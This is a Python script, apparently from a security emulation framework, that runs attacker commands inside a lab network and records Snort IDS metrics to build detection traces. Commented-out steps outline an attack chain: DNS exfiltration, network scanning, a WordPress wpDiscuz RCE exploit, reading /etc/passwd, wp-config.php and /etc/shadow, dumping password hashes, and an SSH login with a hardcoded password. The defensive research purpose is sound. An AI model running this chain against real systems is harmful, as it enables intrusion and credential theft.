import time
import math
import io
import json
from typing import List, Tuple
from csle_common.util.emulation_util import EmulationUtil
from csle_common.metastore.metastore_facade import MetastoreFacade
import csle_common.constants.constants as constants
from csle_base.encoding.np_encoder import NpEncoder
from csle_cluster.cluster_manager.cluster_controller import ClusterController
from csle_common.logging.log import Logger

if __name__ == '__main__':
    emulation = "csle-level16-070"
    sleep_time_seconds = 45
    executions = MetastoreFacade.list_emulation_executions_for_a_given_emulation(emulation_name=emulation)
    if len(executions) == 0:
        raise ValueError(f"There is no execution of an emulation with name: {emulation}")

    # There must be an execution of level 16 running first, otherwise the list is empty
    execution = executions[0]
    emulation_env_config = execution.emulation_env_config

    # Get external attacker ip
    attacker_ip = emulation_env_config.containers_config.get_agent_container().docker_gw_bridge_ip

    # Get subnetworks
    # This gives a list:
    # ['15.16.1.0/24', '15.9.2.0/24', '15.9.3.0/24', '15.9.4.0/24', '15.9.5.0/24', '15.9.6.0/24', '15.9.7.0/24',
    # '15.9.8.0/24', '15.9.9.0/24']
    subnet_masks = emulation_env_config.topology_config.subnetwork_masks
    Logger.__call__().get_logger().info(f"Subnet masks: {subnet_masks}")

    # Get external ip of specific container
    samba_server_ip = (emulation_env_config.containers_config.get_container_from_full_name("csle_samba_1_3-level16-15").docker_gw_bridge_ip)
    vpn_server_ip = (emulation_env_config.containers_config.get_container_from_full_name("csle_vpn_base_2-level16-15").docker_gw_bridge_ip)
    router_ip = (emulation_env_config.containers_config.get_container_from_full_name("csle_router_2_1-level16-15").docker_gw_bridge_ip)

    # Attacker actions
    attacker_actions: List[Tuple[str, str]] = [

        # !!
        # Fix iptables
        ("sudo iptables -I INPUT 3 -d 15.16.3.0/24 -j ACCEPT; sudo iptables -I OUTPUT 4 -d 15.16.3.0/24 -j ACCEPT; sudo iptables -I FORWARD 4 -d 15.16.3.0/24 -j ACCEPT", attacker_ip),
        ("sudo iptables -I INPUT 3 -d 15.16.2.0/24 -j ACCEPT; sudo iptables -I OUTPUT 4 -d 15.16.2.0/24 -j ACCEPT; sudo iptables -I FORWARD 4 -d 15.16.2.0/24 -j ACCEPT", attacker_ip),
        ("sudo iptables -t nat -A POSTROUTING -s 172.16.254.0/24 -o eth0 -j MASQUERADE", vpn_server_ip),
        ("sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", router_ip),
        
        # These steps are tracked by the IDS
        # |
        # V
        # DNS exfiltration start 
        # ("/dns_exfiltrator.sh &", samba_server_ip),
        
        # ("nmap -sn 15.16.1.0/24", attacker_ip),
        # ("nmap -sn 15.16.2.0/24", attacker_ip),
        # ("nmap -sn 15.16.3.0/24", attacker_ip),
        
        # # 1. connect to the vpn
        # ("sudo openvpn --config  /vpn-files/openvpn-config-sl001-daniel-cox.ovpn &", attacker_ip),
       
        # # 2. Services scan
        # #       Samba / Wordpress / OwnCloud / External Email
        # ("nmap -sC -sV --top-ports 1000 15.16.3.33", attacker_ip),
        # ("nmap -sC -sV --top-ports 1000 15.16.3.32", attacker_ip),
        # ("nmap -sC -sV --top-ports 1000 15.16.2.24", attacker_ip),
        # ("nmap -sC -sV --top-ports 1000 15.16.1.14", attacker_ip),

        # # 3. Scan on WordPress server
        # #       wpscan
        # #       ffuf on the wordpress server generic scan
        # #       NOTE: change the size of the wordlist if needed
        # ("wpscan --url http://15.16.3.32", attacker_ip),
        # ("dirb http://15.16.3.32", attacker_ip),
        # # ("head -100 /SecLists/Discovery/Web-Content/common.txt > /home/csle_admin/common_short.txt && ffuf -u http://15.16.3.32/FUZZ -w /home/csle_admin/common_short.txt", attacker_ip),
 
        # # 4. Upload RCE shell exploit WpDiscuz vuln
        # # NOTE: update the date of the post if needed, the date depends on the day the emulation env is started
        # ("python3 /wpDiscuz_RemotqeCodeExec.py -u http://15.16.3.32/ -p /2025/03/17/hello-world/", attacker_ip),
        
        # # |
        # # V
        
        # # 5. WordPress host recon executed by the same script
        # # commands = "ls -l /var/www", "id", "id", "netstat -nat", "whoami", "date", "cat /proc/meminfo", 
        # #   "netstat -l", "who", "pwd", "clear", "ip addr", "ls -l", "uname -r", "ps -A", 
        # #   "cat /etc/resolv.conf", "last", "uptime", "cat /etc/passwd", "lsb_release -a", 
        # #   "netstat -t", "df -h", "ls -laR /var/www", "uname -a", "ls -l /home", "cat /etc/group",
        # #   "cat /var/www/html/wordpress/wp-config.php", "mysql -u wordpress -pwordpress wordpress -N -e "SELECT user_pass FROM wp_users" | tail -n 1 > hash.txt"]
        
        # # These steps are not tracked by the IDS
        # # |
        # # V
        # # 6. Password cracking 2 ways: 
        # #   1. grab hash, crack outside the wordpress server
        # #   or
        # #   2. crack the hask inside the wordpress server we need john the reaper inside the machine
        # #       attacker has to install the tool inside the server

        # # 7. the attacker crack the root password and now he can escalate the privs
        # # 8. ssh into the wp machine + commands
        # ("echo \"./script.sh\" | sshpass -p \"csle@admin-pw_191\" ssh csle_admin@15.16.3.32", attacker_ip),

        # #!/bin/bash

        # commands=(
        #     "sudo -l"
        #     "sudo cat /etc/shadow"
        #     "groups"
        #     "ls -ld /root"
        #     "getent passwd"
        #     "cat /etc/fstab"
        #     "uname -ar"
        #     "ifconfig"
        #     "netstat -u"
        #     "ps -aux"
        #     "sudo ls -laR /root/"
        # )

        # for cmd in "${commands[@]}"; do
        #     echo "Running: $cmd"
        #     eval "$cmd"
        #     echo "-----------------------------------"
        #     sleep 10
        # done

    ]

    data = {}
    data["attacker_cmds"] = []
    data["attacker_ips"] = []
    data["snort_metrics"] = []

    for action in attacker_actions:
        # Decompose the action
        cmd, ip = action

        # Connect to host from which the attacker action will be executed
        conn = emulation_env_config.connect(ip=ip, username=constants.CSLE_ADMIN.SSH_USER,
                                            pw=constants.CSLE_ADMIN.SSH_PW, create_producer=False)

        # Execute actions
        start = time.time()
        Logger.__call__().get_logger().info(f"Running command: {cmd}, from container with ip {ip}")
        list_return = EmulationUtil.execute_ssh_cmds(cmds=[cmd], conn=conn, wait_for_completion=True)
        outdata, errdata, time_taken = list_return[0]
        Logger.__call__().get_logger().info(f"Outdata: {outdata}; Errdata: {errdata}; Time: {time_taken}")
        Logger.__call__().get_logger().info("Command completed")

        # Wait <sleep_time_seconds> to allow data to propagate in the system
        Logger.__call__().get_logger().info(f"Sleeping {sleep_time_seconds}s to allow data to propagate in the system")
        time.sleep(sleep_time_seconds)
        end = time.time()
        duration_minutes = math.ceil((end - start) / 60)
        Logger.__call__().get_logger().info(f"Collecting measurement data from the last {duration_minutes} minutes")

        # Collect measurements
        time_series = ClusterController.get_execution_time_series_data(
            ip=execution.emulation_env_config.kafka_config.container.physical_host_ip,
            port=constants.GRPC_SERVERS.CLUSTER_MANAGER_PORT, minutes=duration_minutes,
            ip_first_octet=execution.ip_first_octet, emulation=execution.emulation_env_config.name)

        Logger.__call__().get_logger().info("Data collection complete")

        # Populate trace
        aggregate_snort_metrics = time_series.agg_snort_ids_metrics[0]
        for i in range(1, len(time_series.agg_snort_ids_metrics)):
            aggregate_snort_metrics.add(time_series.agg_snort_ids_metrics[i])

        data["snort_metrics"].append(aggregate_snort_metrics.to_dict())
        data["attacker_ips"].append(ip)
        data["attacker_cmds"].append(cmd)

        # Save trace to json file
        json_str = json.dumps(data, indent=4, sort_keys=True, cls=NpEncoder)
        with io.open("/home/admin/trace.json", 'w', encoding='utf-8') as f:
            f.write(json_str)
